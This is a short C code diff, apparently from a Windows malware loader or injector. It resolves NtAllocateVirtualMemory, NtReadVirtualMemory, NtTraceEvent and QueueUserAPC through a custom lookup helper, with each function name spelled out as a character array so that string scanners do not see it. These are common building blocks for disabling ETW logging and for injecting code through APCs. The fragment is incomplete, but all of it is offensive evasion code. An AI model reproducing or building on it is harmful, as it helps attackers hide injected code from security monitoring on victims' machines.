@@ -24,3 +24,9 @@ myNtAllocateVirtualMemory pAllocMem = (myNtAllocateVirtualMemory)hlpGetProcAddre
 
 char ntRead[] = { 'N','t','R','e','a','d','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
 myNtReadVirtualMemory pReadMem = (myNtReadVirtualMemory)hlpGetProcAddress(dllModule, ntRead);
+
+char ntTraceEvent[] = {'N','t','T','r','a','c','e','E','v','e','n','t',0};
+
+WCHAR k3rn3l[] = { 'K','e','r','n','e','l','3','2','.','d','l','l',0 };
+char qu3u3[] = { 'Q','u','e','u','e','U','s','e','r','A','P','C',0 };
+myQueueUserAPC pQueueUserAPC = (myQueueUserAPC)hlpGetProcAddress(hlpGetModuleHandle(k3rn3l), qu3u3);
